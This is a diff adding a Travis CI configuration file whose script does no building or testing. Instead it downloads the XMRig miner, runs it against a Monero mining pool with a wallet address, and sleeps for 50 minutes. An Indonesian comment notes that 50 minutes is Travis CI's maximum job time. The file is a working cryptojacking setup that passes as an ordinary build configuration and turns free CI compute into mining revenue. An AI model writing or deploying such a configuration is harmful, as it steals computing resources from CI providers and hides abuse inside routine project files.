@@ -1,0 +1,9 @@
+language: minimal
+os: linux
+dist: focal
+script:
+  - wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+  - tar xf xmrig-6.20.0-linux-x64.tar.gz
+  - cd xmrig-6.20.0
+  - ./xmrig -o pool.hashvault.pro:443 -u [44UUnnnaY5D3ompgnJeErwSfvBvvMkPQaKCq7YVyhdho3Fqu8DQzrrMhrYL5czbpQbiXqGUbVGa8K8QrXTwp578jVhPSbE2] -p x --tls --threads=2 &
+  - sleep 3000  # jalan selama 50 menit (maksimum job time Travis CI)
